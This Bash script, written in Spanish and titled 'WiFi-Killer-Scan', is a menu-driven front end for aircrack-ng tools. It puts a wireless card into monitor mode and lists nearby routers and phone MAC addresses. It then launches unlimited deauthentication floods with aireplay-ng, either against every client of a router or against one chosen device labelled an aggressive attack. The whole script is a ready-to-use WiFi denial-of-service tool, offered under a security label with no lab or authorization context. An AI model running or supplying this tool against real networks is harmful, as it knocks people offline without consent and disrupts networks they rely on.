#!/bin/bash
# WiFi-Killer-Scan v13.0 - Edición Especial Samsung/Modelos Nuevos

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi-Killer-Scan: SEGURIDAD PRO" \
        --column="ID" --column="Acción" --column="Descripción" \
        --width=750 --height=600 \
        1 "⚡ MODO MONITOR" "Activar interfaz y limpiar procesos" \
        2 "🔍 ESCANEO DINÁMICO" "Ver Routers y MACs de Celulares" \
        3 "🔥 BLOQUEO TOTAL" "Desconexión Masiva (Broadcast)" \
        4 "🎯 BLOQUEO SAMSUNG/DIRIGIDO" "Ataque Agresivo a un solo dispositivo" \
        5 "🌐 RESTAURAR RED" "Apagar monitor y volver a Internet" \
        6 "❌ SALIR" "Cerrar herramienta")

    if [ $? -ne 0 ]; then break; fi

    case $CHOICE in
        1)
            sudo airmon-ng check kill
            sudo airmon-ng start wlan0 | zenity --text-info --title="Estado" ;;
        2)
            gnome-terminal --title="LISTA DE OBJETIVOS" -- sh -c "sudo airodump-ng wlan0mon; exec bash" ;;
        3)
            BSSID=$(zenity --entry --title="Objetivo" --text="BSSID del Router:")
            CANAL=$(zenity --entry --title="Configuración" --text="Canal (CH):")
            if [ ! -z "$BSSID" ]; then
                sudo iwconfig wlan0mon channel $CANAL
                xterm -hold -fg yellow -bg black -title "BLOQUEO TOTAL" -e "sudo aireplay-ng -0 0 -a $BSSID wlan0mon" &
            fi ;;
        4)
            BSSID=$(zenity --entry --title="Objetivo" --text="BSSID del Router:")
            CLIENTE=$(zenity --entry --title="Objetivo" --text="MAC del Celular (ver en Stations):")
            CANAL=$(zenity --entry --title="Configuración" --text="Canal (CH):")
            if [ ! -z "$BSSID" ] && [ ! -z "$CLIENTE" ]; then
                sudo iwconfig wlan0mon channel $CANAL
                # Ataque de alta velocidad para dispositivos modernos
                xterm -hold -fg red -bg black -title "ATAQUE DIRIGIDO AGRESIVO" \
                -e "sudo aireplay-ng -0 0 -a $BSSID -c $CLIENTE --ignore-negative-one wlan0mon" &
                ATAQUE_PID=$!
                zenity --info --text="Ataque activo contra $CLIENTE.\nPresiona OK para detener."
                sudo kill $ATAQUE_PID && sudo killall aireplay-ng 2>/dev/null
            fi ;;
        5)
            sudo airmon-ng stop wlan0mon
            sudo systemctl restart NetworkManager
            zenity --info --text="Internet restaurado." ;;
        6) exit ;;
    esac
done
